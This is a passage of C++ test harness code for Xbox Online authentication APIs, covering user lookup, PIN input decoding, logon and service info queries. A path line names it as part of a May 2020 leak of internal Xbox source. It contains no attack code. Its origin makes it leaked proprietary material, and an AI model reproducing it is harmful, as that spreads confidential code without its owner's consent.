		FAIL_TESTCASE("XOnlineGetUsers returned success, but should have failed");
	}

	END_TESTCASE();
*/

/* Causes RIP
	START_TESTCASE("Get user accounts with NULL pcUsers");

	//failure case #5; call with NULL pcUsers
	hr = XOnlineGetUsers( XONLINE_LOCAL_HARD_DRIVE, UsersArray, NULL );

	xLog(hLog, XLL_INFO, "XOnlineGetUsers returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlineGetUsers failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineGetUsers returned success, but should have failed");
	}

	END_TESTCASE();
*/


	//success case #1; call with mounted MMU and user accounts
	//  at this point there is no way to get accounts onto the MMU




	START_TESTCASE("Get user accounts off of hard-drive");

	//success case #2; call with local hd and user accounts
	hr = XOnlineGetUsers( XONLINE_LOCAL_HARD_DRIVE, UsersArray, &dwNumUsers );

	xLog(hLog, XLL_INFO, "XOnlineGetUsers returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		FAIL_TESTCASE("XOnlineGetUsers failed unexpectedly");
	}
	else
	{
		xLog(hLog, XLL_INFO, "XOnlineGetUsers found %u users", dwNumUsers);
		PASS_TESTCASE("XOnlineGetUsers succeeded");
	}

	END_TESTCASE();

	return;
}

VOID WINAPI xauthtest_XOnlinePINStartInput(HANDLE hLog)
{
	XINPUT_STATE inputState;
	XPININPUTHANDLE hPinInput;
	

/* Causes RIP
	START_TESTCASE("Start PIN input with NULL input state");

	//failure case #1; call with NULL pInputState
	hPinInput = XOnlinePINStartInput( NULL );

	xLog(hLog, XLL_INFO, "XOnlinePINStartInput returned 0x%08x", hPinInput);
	if( hPinInput == NULL )
	{
		PASS_TESTCASE("XOnlinePINStartInput failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlinePINStartInput returned success but should have failed");
	}

	END_TESTCASE();
*/

	START_TESTCASE("Start PIN input with valid input state");

	//success case #1; call with a valid pInputState
	//
	//set XINPUT_STATE values
	inputState.dwPacketNumber = 1;
	inputState.Gamepad.wButtons = 0;
	inputState.Gamepad.bAnalogButtons[0] = 0;
	inputState.Gamepad.bAnalogButtons[1] = 0;
	inputState.Gamepad.bAnalogButtons[2] = 0;
	inputState.Gamepad.bAnalogButtons[3] = 0;
	inputState.Gamepad.bAnalogButtons[4] = 0;
	inputState.Gamepad.bAnalogButtons[5] = 0;
	inputState.Gamepad.bAnalogButtons[6] = 0;
	inputState.Gamepad.bAnalogButtons[7] = 0;
	inputState.Gamepad.sThumbLX = 0;
	inputState.Gamepad.sThumbLY = 0;
	inputState.Gamepad.sThumbRX = 0;
	inputState.Gamepad.sThumbRY = 0;

	hPinInput = XOnlinePINStartInput( &inputState );

	xLog(hLog, XLL_INFO, "XOnlinePINStartInput returned 0x%08x", hPinInput);
	if( hPinInput != NULL )
	{
		PASS_TESTCASE("XOnlinePINStartInput succeeded");
	}
	else
	{
		FAIL_TESTCASE("XOnlinePINStartInput failed unexpectedly");
	}

	END_TESTCASE();

	return;
}


VOID WINAPI xauthtest_XOnlinePINDecodeInput(HANDLE hLog)
{
	HRESULT hr;
	XINPUT_STATE inputState;
	BYTE pinByte;
	XPININPUTHANDLE hPinInput;

	//set initial XINPUT_STATE
	inputState.dwPacketNumber = 10;
	inputState.Gamepad.wButtons = 0;
	inputState.Gamepad.bAnalogButtons[0] = 0;
	inputState.Gamepad.bAnalogButtons[1] = 0;
	inputState.Gamepad.bAnalogButtons[2] = 0;
	inputState.Gamepad.bAnalogButtons[3] = 0;
	inputState.Gamepad.bAnalogButtons[4] = 0;
	inputState.Gamepad.bAnalogButtons[5] = 0;
	inputState.Gamepad.bAnalogButtons[6] = 0;
	inputState.Gamepad.bAnalogButtons[7] = 0;
	inputState.Gamepad.sThumbLX = 0;
	inputState.Gamepad.sThumbLY = 0;
	inputState.Gamepad.sThumbRX = 0;
	inputState.Gamepad.sThumbRY = 0;

	//get pin handle needed for further decoding
	hPinInput = XOnlinePINStartInput( &inputState );
	
	xLog(hLog, XLL_INFO, "XOnlinePINStartInput returned 0x%08x", hPinInput);
	if(!hPinInput)
	{
		xLog(hLog, XLL_FAIL, "Couldn't start PIN input for decoding tests");
		return;
	}

/* Causes RIP
	START_TESTCASE("Decode PIN input with NULL input handle");

	//failure case #1; call with NULL handle
	hr = XOnlinePINDecodeInput( NULL, &inputState, &pinByte );
	
	xLog(hLog, XLL_INFO, "XOnlinePINDecodeInput returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlinePINDecodeInput failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlinePINDecodeInput returned success but should have failed");
	}
	
	END_TESTCASE();
*/


/* Causes RIP
	START_TESTCASE("Decode PIN input with NULL PIN byte pointer");

	//failure case #2; call with NULL pPINByte
	//
	//advance dwPacketNumber
	inputState.dwPacketNumber = 15;
	hr = XOnlinePINDecodeInput( hPinInput, &inputState, NULL );
	
	xLog(hLog, XLL_INFO, "XOnlinePINDecodeInput returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlinePINDecodeInput failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlinePINDecodeInput returned success but should have failed");
	}
	
	END_TESTCASE();
*/

/* Causes RIP
	START_TESTCASE("Decode PIN input with NULL PIN input state");

	//failure case #3; call with NULL pInputState
	hr = XOnlinePINDecodeInput( hPinInput, NULL, &pinByte );
	
	xLog(hLog, XLL_INFO, "XOnlinePINDecodeInput returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlinePINDecodeInput failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlinePINDecodeInput returned success but should have failed");
	}
	
	END_TESTCASE();
*/

	//failure case #4, no longer applies as the game code checks PIN values
	//failure case #5, TBC
	


	START_TESTCASE("Decode PIN input with changed input state");

	//success case #1; call with valid arguments
	//change the input state for decoding to work
	inputState.dwPacketNumber = 20;
	inputState.Gamepad.bAnalogButtons[5] = 0;
	hr = XOnlinePINDecodeInput( hPinInput, &inputState, &pinByte );
	
	xLog(hLog, XLL_INFO, "XOnlinePINDecodeInput returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		FAIL_TESTCASE("XOnlinePINDecodeInput failed unexpectedly");
	}
	else
	{
		PASS_TESTCASE("XOnlinePINDecodeInput succeeded");
	}
	
	END_TESTCASE();



	//close to hPinInput to conserve resources
	hr = XOnlinePINEndInput( hPinInput );
	if(FAILED(hr))
	{
		xLog(hLog, XLL_FAIL, "Couldn't end PIN input after decoding tests");
		return;
	}

	return;
}

VOID WINAPI xauthtest_XOnlinePINEndInput(HANDLE hLog)
{
	HRESULT	hr;
	XINPUT_STATE inputState;
	BYTE pinByte;
	XPININPUTHANDLE hPinInput;

	//set initial XINPUT_STATE
	inputState.dwPacketNumber = 10;
	inputState.Gamepad.wButtons = 0;
	inputState.Gamepad.bAnalogButtons[0] = 0;
	inputState.Gamepad.bAnalogButtons[1] = 0;
	inputState.Gamepad.bAnalogButtons[2] = 0;
	inputState.Gamepad.bAnalogButtons[3] = 0;
	inputState.Gamepad.bAnalogButtons[4] = 0;
	inputState.Gamepad.bAnalogButtons[5] = 0;
	inputState.Gamepad.bAnalogButtons[6] = 0;
	inputState.Gamepad.bAnalogButtons[7] = 0;
	inputState.Gamepad.sThumbLX = 0;
	inputState.Gamepad.sThumbLY = 0;
	inputState.Gamepad.sThumbRX = 0;
	inputState.Gamepad.sThumbRY = 0;

	//get pin handle needed for testing closing
	hPinInput = XOnlinePINStartInput( &inputState );

	xLog(hLog, XLL_INFO, "XOnlinePINStartInput returned 0x%08x", hPinInput);
	if(!hPinInput)
	{
		xLog(hLog, XLL_FAIL, "Couldn't start PIN input for decoding tests");
		return;
	}


/* Causes RIP
	START_TESTCASE("End PIN input with NULL input handle");

	//failure case #1; call with NULL handle
	hr = XOnlinePINEndInput( NULL );

	xLog(hLog, XLL_INFO, "XOnlinePINEndInput returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlinePINEndInput failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlinePINEndInput returned success but should have failed");
	}

	END_TESTCASE();
*/


	START_TESTCASE("End PIN input with valid input handle");

	//success case #1; call with a valid handle
	hr = XOnlinePINEndInput( hPinInput );

	xLog(hLog, XLL_INFO, "XOnlinePINEndInput returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		FAIL_TESTCASE("XOnlinePINEndInput failed unexpectedly");
	}
	else
	{
		PASS_TESTCASE("XOnlinePINEndInput succeeded");
	}

	END_TESTCASE();

	return;
}

VOID WINAPI xauthtest_XOnlineLogon(HANDLE hLog)
{
	HRESULT hr;
	XONLINE_SERVICE ServicesArray[] =
	{
		{ XONLINE_CATALOG_REFERRAL_SERVICE, S_OK, NULL },
		{ XONLINE_DOWNLOAD_SERVICE, S_OK, NULL },
		{ XONLINE_UPLOAD_SERVICE, S_OK, NULL },
		{ XONLINE_MATCHMAKING_SERVICE, S_OK, NULL }
	};
	XONLINE_USER UsersArray[XONLINE_MAX_STORED_ONLINE_USERS];
	DWORD dwNumUsers;
	XONLINETASK_HANDLE hLogon = NULL;
	DWORD cServices = sizeof(ServicesArray) / sizeof(XONLINE_SERVICE);
	HANDLE hEvent = NULL;
	BOOL fCompleted = TRUE;

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
	{
		xLog(hLog, XLL_FAIL, "Couldn't create event for logon tests");
		goto Exit;
	}


	//make sure there are temporary accounts
	XOnlineSetupTempAccounts( TRUE, XONLINE_LOCAL_HARD_DRIVE, 8 );
	//obtain these accounts
	hr = XOnlineGetUsers( XONLINE_LOCAL_HARD_DRIVE, UsersArray, &dwNumUsers );

	xLog(hLog, XLL_INFO, "XOnlineGetUsers returned 0x%08x", hr);
	if(FAILED(hr))
	{
		xLog(hLog, XLL_FAIL, "Couldn't get local users for logon tests");
		goto Exit;
	}



	START_TESTCASE("Logon with NULL users pointer");

	//failure case #1; call with NULL pUsers pointer
	hr = XOnlineLogon( NULL, ServicesArray, cServices, NULL, &hLogon );

	xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlineLogon failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineLogon returned success but should have failed");
	}

	END_TESTCASE();


/* TEMP still causes crash
	START_TESTCASE("Logon with NULL services pointer");

	//failure case #2; call with NULL pServices
	hr = XOnlineLogon( UsersArray, NULL, 1, NULL, &hLogon );

	xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlineLogon failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineLogon returned success but should have failed");
	}

	END_TESTCASE();
*/

/* Causes RIP
	START_TESTCASE("Logon with 0 services count");

	//failure case #3; call with 0 count of services
	hr = XOnlineLogon( UsersArray, ServicesArray, 0, NULL, &hLogon );

	xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlineLogon failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineLogon returned success but should have failed");
	}

	END_TESTCASE();
*/


	//failure case #4; call when there is an update
	//at this time I cannot force a required update

	//failure case #5; not loger applies, Logon is not thread safe

	//failure cases #6, #7, #8, #9 will be implemented later



	START_TESTCASE("Logon with duplicate users");

	//failure case #10; duplicate accounts
	memcpy( UsersArray + 1, UsersArray, sizeof(XONLINE_USER) );
	hr = XOnlineLogon( UsersArray, ServicesArray, cServices, NULL, &hLogon );

	xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlineLogon failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineLogon returned success but should have failed");
	}

	END_TESTCASE();



	START_TESTCASE("Logon with one local users");

	//success case #1; call with valid arguments
	// recreate accounts array
	XOnlineSetupTempAccounts( TRUE, XONLINE_LOCAL_HARD_DRIVE, 1 );
	XOnlineGetUsers( XONLINE_LOCAL_HARD_DRIVE, UsersArray, &dwNumUsers );
	hr = XOnlineLogon( UsersArray, ServicesArray, cServices, hEvent, &hLogon );

	xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		FAIL_TESTCASE("XOnlineLogon failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hLogon, hEvent, 30000, NULL, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
		FAIL_TESTCASE("XOnlineLogon failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("XOnlineLogon didn't complete after 30 seconds");
	}

	PASS_TESTCASE("XOnlineLogon succeeded");

	END_TESTCASE();
	CLEANUP_TASK(hLogon);


	START_TESTCASE("Logon with all local users");

	//success case #2; call with valid argument and maximum num of users
	XOnlineSetupTempAccounts( TRUE, XONLINE_LOCAL_HARD_DRIVE, XONLINE_MAX_STORED_ONLINE_USERS );
	XOnlineGetUsers( XONLINE_LOCAL_HARD_DRIVE, UsersArray, &dwNumUsers );
	hr = XOnlineLogon( UsersArray, ServicesArray, cServices, hEvent, &hLogon );

	xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		FAIL_TESTCASE("XOnlineLogon failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hLogon, hEvent, 30000, NULL, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
		FAIL_TESTCASE("XOnlineLogon failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("XOnlineLogon didn't complete after 30 seconds");
	}

	PASS_TESTCASE("XOnlineLogon succeeded");

	END_TESTCASE();
	CLEANUP_TASK(hLogon);

Exit:

	if(hEvent)
		CloseHandle(hEvent);

	return;
}

VOID WINAPI xauthtest_XOnlineGetServiceInfo(HANDLE hLog)
{
	HRESULT hr = S_OK;
	PXONLINE_SERVICE_INFO pServiceInfo = NULL;
	XONLINE_SERVICE ServicesArray[] =
	{
		{ XONLINE_CATALOG_REFERRAL_SERVICE, S_OK, NULL },
		{ XONLINE_DOWNLOAD_SERVICE, S_OK, NULL },
		{ XONLINE_UPLOAD_SERVICE, S_OK, NULL },
		{ XONLINE_MATCHMAKING_SERVICE, S_OK, NULL }
	};
	XONLINE_USER UsersArray[XONLINE_MAX_STORED_ONLINE_USERS];
	DWORD dwNumUsers;
	XONLINETASK_HANDLE hLogon = NULL;
	DWORD cServices = sizeof(ServicesArray) / sizeof(XONLINE_SERVICE);
	HANDLE hEvent = NULL;
	BOOL fCompleted = TRUE;

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
	{
		xLog(hLog, XLL_FAIL, "Couldn't create event for logon tests");
		goto Exit;
	}

	START_TESTCASE("Get service info with NULL service handle");

	pServiceInfo = XOnlineGetServiceInfo(NULL);

	xLog(hLog, XLL_INFO, "XOnlineGetServiceInfo returned 0x%08x", hr);
	if(!pServiceInfo)
	{
		PASS_TESTCASE("XOnlineGetServiceInfo failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineGetServiceInfo returned success but should have failed");
	}

	END_TESTCASE();



	START_TESTCASE("Get service info for all services");

	//success case #1; call with all services
	XOnlineSetupTempAccounts( TRUE, XONLINE_MAX_STORED_ONLINE_USERS );
	XOnlineGetUsers( XONLINE_LOCAL_HARD_DRIVE, UsersArray, &dwNumUsers );
	hr = XOnlineLogon( UsersArray, ServicesArray, cServices, hEvent, &hLogon );

	xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		FAIL_TESTCASE("XOnlineLogon failed unexpectedly");
	}

	hr = PollTaskUntilComplete(hLogon, hEvent, 30000, NULL, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
		FAIL_TESTCASE("XOnlineLogon failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("XOnlineLogon didn't complete after 30 seconds");
	}

	// Get catalog service info
	pServiceInfo = XOnlineGetServiceInfo(ServicesArray[0].handle);

	xLog(hLog, XLL_INFO, "XOnlineGetServiceInfo returned 0x%08x", hr);
	if(!pServiceInfo)
	{
		FAIL_TESTCASE("XOnlineGetServiceInfo failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "Service 1 (Name %s, Address 0x%08x, Port 0x%04x",
		pServiceInfo->serviceName, pServiceInfo->dwServiceIP, pServiceInfo->wServicePort);

	// Get catalog service info
	pServiceInfo = XOnlineGetServiceInfo(ServicesArray[1].handle);

	xLog(hLog, XLL_INFO, "XOnlineGetServiceInfo returned 0x%08x", hr);
	if(!pServiceInfo)
	{
		FAIL_TESTCASE("XOnlineGetServiceInfo failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "Service 2 (Name %s, Address 0x%08x, Port 0x%04x",
		pServiceInfo->serviceName, pServiceInfo->dwServiceIP, pServiceInfo->wServicePort);

	// Get catalog service info
	pServiceInfo = XOnlineGetServiceInfo(ServicesArray[2].handle);

	xLog(hLog, XLL_INFO, "XOnlineGetServiceInfo returned 0x%08x", hr);
	if(!pServiceInfo)
	{
		FAIL_TESTCASE("XOnlineGetServiceInfo failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "Service 3 (Name %s, Address 0x%08x, Port 0x%04x",
		pServiceInfo->serviceName, pServiceInfo->dwServiceIP, pServiceInfo->wServicePort);

	// Get catalog service info
	pServiceInfo = XOnlineGetServiceInfo(ServicesArray[3].handle);

	xLog(hLog, XLL_INFO, "XOnlineGetServiceInfo returned 0x%08x", hr);
	if(!pServiceInfo)
	{
		FAIL_TESTCASE("XOnlineGetServiceInfo failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "Service 4 (Name %s, Address 0x%08x, Port 0x%04x",
		pServiceInfo->serviceName, pServiceInfo->dwServiceIP, pServiceInfo->wServicePort);

	PASS_TESTCASE("Retrieved info for all services");

	END_TESTCASE();
	CLEANUP_TASK(hLogon);

	START_TESTCASE("Get service info for all services");




	END_TESTCASE();

Exit:

	if(hEvent)
		CloseHandle(hEvent);

	return;
}

//==================================================================================
// XAuthTestStartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//	HANDLE		hLog			Handle to logging subsystem
// Returns:
//	none
//==================================================================================
VOID WINAPI XAuthTestStartTest(IN HANDLE  hLog)
{
	xSetOwnerAlias(hLog, "tristanj");
    xSetComponent(hLog, "Online", "Authentication - Client (O)");

	xSetFunctionName(hLog, "XOnlineHasMachineAccount");
	xauthtest_XOnlineHasMachineAccount(hLog);
	xSetFunctionName(hLog, "");

	xSetFunctionName(hLog, "XOnlineGetUsers");
	xauthtest_XOnlineGetUsers(hLog);
	xSetFunctionName(hLog, "");

	xSetFunctionName(hLog, "XOnlinePINStartInput");
	xauthtest_XOnlinePINStartInput(hLog);
	xSetFunctionName(hLog, "");

	xSetFunctionName(hLog, "XOnlinePINDecodeInput");
	xauthtest_XOnlinePINDecodeInput(hLog);
	xSetFunctionName(hLog, "");

	xSetFunctionName(hLog, "XOnlinePINEndInput");
	xauthtest_XOnlinePINEndInput(hLog);
	xSetFunctionName(hLog, "");

	xSetFunctionName(hLog, "XOnlineLogon");
	xauthtest_XOnlineLogon(hLog);
	xSetFunctionName(hLog, "");

	xSetFunctionName(hLog, "XOnlineGetServiceInfo");
	xauthtest_XOnlineGetServiceInfo(hLog);
	xSetFunctionName(hLog, "");

	return;
}

//==================================================================================
// XAuthTestEndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//	none
// Returns:
//	none
//==================================================================================
VOID WINAPI XAuthTestEndTest()
{

}

} // namespace XAuthTestNamespace

// Define harness stuff
#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XAuthTest )
#pragma data_seg()

// Define export table for harness
BEGIN_EXPORT_TABLE( XAuthTest )
    EXPORT_TABLE_ENTRY( "StartTest", XAuthTestStartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XAuthTestEndTest )
    EXPORT_TABLE_ENTRY( "DllMain", XAuthTestDllMain )
END_EXPORT_TABLE( XAuthTest )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xauth\bvt\xauthbvt.cpp ===
//==================================================================================
// Includes
//==================================================================================
#define INITGUID
#include "xauthbvt.h"


//@@@ drm: XOnlineSetupTempAccounts has been removed
#define XOnlineSetupTempAccounts( a, b, c ) (E_FAIL)

using namespace XAuthBVTNamespace;

namespace XAuthBVTNamespace {

//==================================================================================
// Globals
//==================================================================================
HANDLE g_hHeap = NULL;

//==================================================================================
// PollTaskUntilComplete
//----------------------------------------------------------------------------------
//
// Description: Calls the XOnlineTaskComplete function until either the given
//    task has been completed or the amount of available time has expired
//
// Arguments:
//	XONLINETASK_HANDLE	hAsyncHandle		Handle to async task
//	HANDLE				hWorkToDoEvent		Event that is associated with this async task.
//											This can be set to NULL or INVALID_HANDLE_VALUE
//											if no event is associated with the task
//	DWORD				dwMaxWaitTime		Maximum amount of time to wait for the task to
//											complete. This can be set to INFINITE to block
//											until completion
//	DWORD				*pdwPollCounter		Optional counter passed in to keep track of the
//											number of calls made to the XOnlineTaskDoWork2 function
//	BOOL				*pfCompleted		Optional boolean passed in to keep track if whether
//											the task completed or not
//  BOOL				fCloseOnComplete	Indicates whether the function should close a handle
//											after it indicates completion
//
// Returns: The last result code from XOnlineTaskDoWork2 is returned.  If a valid pointer
//   is provided for pfCompleted, it is updated to reflect whether the task has completed or not
//==================================================================================
HRESULT PollTaskUntilComplete(XONLINETASK_HANDLE hAsyncHandle, HANDLE hWorkToDoEvent, DWORD dwMaxWaitTime, DWORD *pdwPollCounter, BOOL *pfCompleted, BOOL fCloseOnComplete)
{
	HRESULT hr = S_OK;
	DWORD dwLastTime = 0, dwCurrentTime = 0, dwCurrentDuration = 0, dwWaitTimeLeft = dwMaxWaitTime;
	DWORD dwInternalPollCounter = 0;

	if(pfCompleted)
		*pfCompleted = FALSE;

	dwLastTime = GetTickCount();

	while(TRUE)
	{

		if((hWorkToDoEvent != INVALID_HANDLE_VALUE) && (hWorkToDoEvent != NULL))
			WaitForSingleObject(hWorkToDoEvent, dwWaitTimeLeft);

        hr = XOnlineTaskContinue(hAsyncHandle);

		if(FAILED(hr))
			return hr;

		// Update the poll-counter
		++dwInternalPollCounter;

        if (hr == XONLINETASK_S_SUCCESS)
        {
			if(fCloseOnComplete)
				XOnlineTaskClose(hAsyncHandle);

			if(pfCompleted)
				*pfCompleted = TRUE;

            break;
        }
		
		if(dwMaxWaitTime != INFINITE)
		{
			// See if we have gone beyond the maximum allowed time
			dwCurrentTime = GetTickCount();
			if(dwCurrentTime < dwLastTime)
			{
				dwCurrentDuration = ((MAXDWORD - dwLastTime) + dwCurrentTime);
			}
			else
			{
				dwCurrentDuration = (dwCurrentTime - dwLastTime);
			}
			
			if(dwCurrentDuration >= dwWaitTimeLeft)
			{
				hr = E_FAIL;
				goto Exit;
			}
			
			dwWaitTimeLeft -= dwCurrentDuration;
			dwLastTime = dwCurrentTime;
		}
	}

Exit:
	if(pdwPollCounter)
		*pdwPollCounter = dwInternalPollCounter;

	return hr;
}

//==================================================================================
// VerifyServiceLogons
//----------------------------------------------------------------------------------
//
// Description: Scans through a service array looking for failed logons
//
// Arguments:
//	HANDLE			hLog			Handle to logging subsystem
//	DWORD	        *pServices		Pointer to an array of services
//	DWORD			dwNumServices	Indicates number of services in pServices array
//
// Returns: FALSE if a service in the array failed logon, TRUE other wise
//==================================================================================
BOOL VerifyServiceLogons(HANDLE hLog, DWORD *pServices, DWORD dwNumServices)
{
	BOOL fServiceFailed = FALSE;
	XONLINE_SERVICE_INFO serviceInfo;
	HRESULT hr;
	
	for(DWORD dwCurrentService = 0; dwCurrentService < dwNumServices; ++dwCurrentService)
	{
		if(FAILED(hr = XOnlineGetServiceInfo(pServices[dwCurrentService],&serviceInfo)))
		{
			fServiceFailed = TRUE;
			xLog(hLog, XLL_INFO, "Logon to S%d failed with 0x%08x",
				serviceInfo.dwServiceID, hr);
		}
	}

	return !fServiceFailed;
}

//==================================================================================
// XAuthBVTDllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
BOOL WINAPI XAuthBVTDllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
	WSADATA WSAData;
	XNADDR xnaddr;
	DWORD dwElapsedTime = 0, dwStartTime = 0, dwCurrentTime = 0, dwResult = 0;

	// We'll initialize/delete the global critical section here
	switch(dwReason)
	{
	case DLL_PROCESS_ATTACH:
		XNetAddRef();
		
		dwElapsedTime = 0;
		dwStartTime = GetTickCount();
		
		// Wait until stack initialization completes
		do
		{
			dwCurrentTime = GetTickCount();
			
			// Calculate the elapsed time based on whether the time has wrapped around
			if(dwCurrentTime < dwStartTime)
				dwElapsedTime =  MAXDWORD - dwStartTime + dwCurrentTime;
			else
				dwElapsedTime = dwCurrentTime - dwStartTime;
			
			if(dwElapsedTime > 10000)
			{
				OutputDebugString(TEXT("Net stack failed to initialize"));
				return FALSE;
			}
			
			dwResult = XNetGetTitleXnAddr (&xnaddr);		
			
		} while (XNET_GET_XNADDR_PENDING == dwResult);

		WSAStartup(MAKEWORD(2, 2), &WSAData);
		g_hHeap = HeapCreate(0,0,0);
		break;
	case DLL_PROCESS_DETACH:
		WSACleanup();
		XNetRelease();
		HeapDestroy(g_hHeap);
		g_hHeap = NULL;
		break;
	default:
		break;
	}

    return TRUE;
}


//==================================================================================
// XAuthBVTStartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//	HANDLE		hLog			Handle to logging subsystem
// Returns:
//	none
//==================================================================================
VOID WINAPI XAuthBVTStartTest(IN HANDLE  hLog)
{
	XONLINETASK_HANDLE hLogon = NULL;
	XPININPUTHANDLE hPinHandle = NULL;
	DWORD ServicesArray[] =
	{
		XONLINE_BILLING_OFFERING_SERVICE,
		XONLINE_MATCHMAKING_SERVICE
	};
	XONLINE_USER UsersArray[XONLINE_MAX_STORED_ONLINE_USERS];
	XINPUT_STATE inputState;
	HRESULT hr = S_OK;
	HANDLE hEvent = NULL;
	DWORD numUsers = 0, cServices = 0;
	BOOL fCompleted = FALSE;
	BYTE pinByte = 0;

	memset(&inputState, 0, sizeof(inputState));
	memset(UsersArray, 0, sizeof(UsersArray));

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
	{
		xLog(hLog, XLL_FAIL, "Couldn't create event for authentication BVT");
		goto Exit;
	}

	xSetOwnerAlias(hLog, "tristanj");
    xSetComponent(hLog, "Online", "Authentication - Client (O)");


#if 0 // XOnlineSetupTempAccounts and XOnlineHasMachineAccount are gone
	xSetFunctionName(hLog, "XOnlineSetupTempAccounts");
	START_TESTCASE("Create temporary user and machine accounts");

	XOnlineSetupTempAccounts( TRUE, XONLINE_LOCAL_HARD_DRIVE, XONLINE_MAX_STORED_ONLINE_USERS );
	PASS_TESTCASE("XOnlineSetupTempAccounts was called" );

	END_TESTCASE();
	xSetFunctionName(hLog, "");



	xSetFunctionName(hLog, "XOnlineHasMachineAccount");
	START_TESTCASE("Look for machine account");

	if(XOnlineHasMachineAccount() == FALSE)
	{
		FAIL_TESTCASE("XOnlineHasMachineAccount didn't find machine account");
	}
	else
	{
		PASS_TESTCASE("XOnlineHasMachineAccount found machine account" );
	}

	END_TESTCASE();
	xSetFunctionName(hLog, "");
#endif


	xSetFunctionName(hLog, "XOnlineGetUsers");
	START_TESTCASE("Look for user accounts");

	hr = XOnlineGetUsers( UsersArray, &numUsers );

	xLog(hLog, XLL_INFO, "XOnlineGetUsers returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		FAIL_TESTCASE("XOnlineGetUsers failed unexpectedly");
	}
	else if(numUsers == 0)
	{
		FAIL_TESTCASE("XOnlineGetUsers returned success but no users were returned");
	}
	else
	{
		xLog(hLog, XLL_INFO, "XOnlineGetUsers found %u users", numUsers);
		PASS_TESTCASE("XOnlineGetUsers succeeded");
	}

	END_TESTCASE();
	xSetFunctionName(hLog, "");



	xSetFunctionName(hLog, "XOnlineLogon");
	START_TESTCASE("Logon to XOnline");

	cServices = sizeof(ServicesArray) / sizeof(DWORD);

	xLog(hLog, XLL_INFO, "Logging %u users into %u services", numUsers, cServices);
	hr = XOnlineLogon(UsersArray, ServicesArray, cServices, hEvent, &hLogon);

	xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
	if (FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineLogon failed unexpectedly");
	}

	xLog(hLog, XLL_INFO, "Waiting for logon to complete");
	hr = PollTaskUntilComplete(hLogon, hEvent, 30000, NULL, &fCompleted, FALSE);
	if(FAILED(hr))
	{
		xLog(hLog, XLL_INFO, "XOnlineLogon returned 0x%08x", hr);
		FAIL_TESTCASE("XOnlineLogon failed unexpectedly");
	}
	else if (!fCompleted)
	{
		FAIL_TESTCASE("XOnlineLogon didn't complete after 30 seconds");
	}
	
	if(!VerifyServiceLogons(hLog, ServicesArray, cServices))
	{
		FAIL_TESTCASE("Failed logon to some services");
	}

	END_TESTCASE();
